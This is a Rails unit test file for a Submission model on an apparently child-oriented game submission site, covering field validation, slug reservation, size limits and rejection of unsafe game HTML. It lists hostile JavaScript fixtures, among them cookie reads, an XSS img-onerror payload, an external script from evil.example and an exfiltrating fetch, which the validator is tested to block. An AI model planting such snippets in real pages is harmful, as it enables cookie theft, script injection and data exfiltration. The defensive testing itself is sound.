require "test_helper"

class SubmissionTest < ActiveSupport::TestCase
  def valid_html_attrs
    {
      kind: "html",
      slug: "test-game-#{SecureRandom.hex(3)}",
      title: "Test Game",
      creators: "Ada & Grace",
      tagline: "A test game.",
      score_direction: "desc",
      game_html: base_game_html,
      contact_email: "parent@example.com",
      status: "pending"
    }
  end

  def valid_prompt_attrs
    {
      kind: "prompt",
      title: "My Cool Idea",
      creators: "Charlie",
      idea_prompt: "A game where you jump over lava as a dinosaur.",
      contact_email: "parent@example.com",
      status: "pending"
    }
  end

  def base_game_html(extra_script = "")
    <<~HTML
      <!DOCTYPE html><html><body>
      <div class="store-banner"><a href="/">EZ-AZ</a></div>
      <script>
        document.addEventListener('keydown', function(e){ if(e.key === 'Escape'){ /* pause */ } });
        fetch('/api/scores?game=test-game').then(function(r){ return r.json(); });
        #{extra_script}
      </script>
      </body></html>
    HTML
  end

  test "html submission is valid with all required fields" do
    assert Submission.new(valid_html_attrs).valid?
  end

  test "html submission requires slug, tagline, score_direction, game_html" do
    s = Submission.new(valid_html_attrs.merge(slug: nil, tagline: nil, score_direction: nil, game_html: nil))
    refute s.valid?
    assert s.errors[:slug].any?
    assert s.errors[:tagline].any?
    assert s.errors[:score_direction].any?
    assert s.errors[:game_html].any?
  end

  test "prompt submission is valid without slug, tagline, score_direction, or game_html" do
    assert Submission.new(valid_prompt_attrs).valid?
  end

  test "prompt submission requires idea_prompt" do
    s = Submission.new(valid_prompt_attrs.merge(idea_prompt: nil))
    refute s.valid?
    assert s.errors[:idea_prompt].any?
  end

  test "prompt submission does not require slug/tagline/score_direction/game_html even if blank" do
    s = Submission.new(valid_prompt_attrs)
    assert_nil s.slug
    assert_nil s.tagline
    assert_nil s.game_html
    assert s.valid?
  end

  test "rejects a reserved slug" do
    s = Submission.new(valid_html_attrs.merge(slug: "descent"))
    refute s.valid?
    assert_match(/already taken/, s.errors[:slug].first)
  end

  test "rejects game_html over the size cap" do
    huge = "<html>" + ("x" * (Submission::MAX_HTML_BYTES + 1))
    s = Submission.new(valid_html_attrs.merge(game_html: huge))
    refute s.valid?
    assert_match(/too large/, s.errors[:game_html].first)
  end

  test "a normal self-contained game passes validation cleanly with no warnings" do
    s = Submission.new(valid_html_attrs)
    assert s.valid?, s.errors.full_messages.join(", ")
    assert_empty s.html_warnings
  end

  test "html_warnings is empty for prompt-kind submissions" do
    s = Submission.new(valid_prompt_attrs)
    assert_empty s.html_warnings
  end

  {
    "document.cookie"                => "var c = document.cookie;",
    "window.parent/top reach"        => "window.parent.postMessage('x', '*');",
    "top.location reach"             => "top.location = 'https://evil.example';",
    "an embedded iframe"             => "<iframe src=\"https://evil.example\"></iframe>",
    "eval()"                         => "eval('1+1');",
    "the Function constructor"       => "new Function('return 1')();",
    "document.write()"               => "document.write('<img src=x onerror=alert(1)>');",
    "an external <script src>"       => "<script src=\"https://evil.example/payload.js\"></script>",
    "an absolute external fetch"     => "fetch('https://evil.example/exfiltrate');"
  }.each do |label, snippet|
    test "hard-rejects html containing #{label}" do
      s = Submission.new(valid_html_attrs.merge(game_html: base_game_html(snippet)))
      refute s.valid?, "expected game_html to be rejected for: #{label}"
      assert_match(/was rejected/, s.errors[:game_html].join)
    end
  end
end
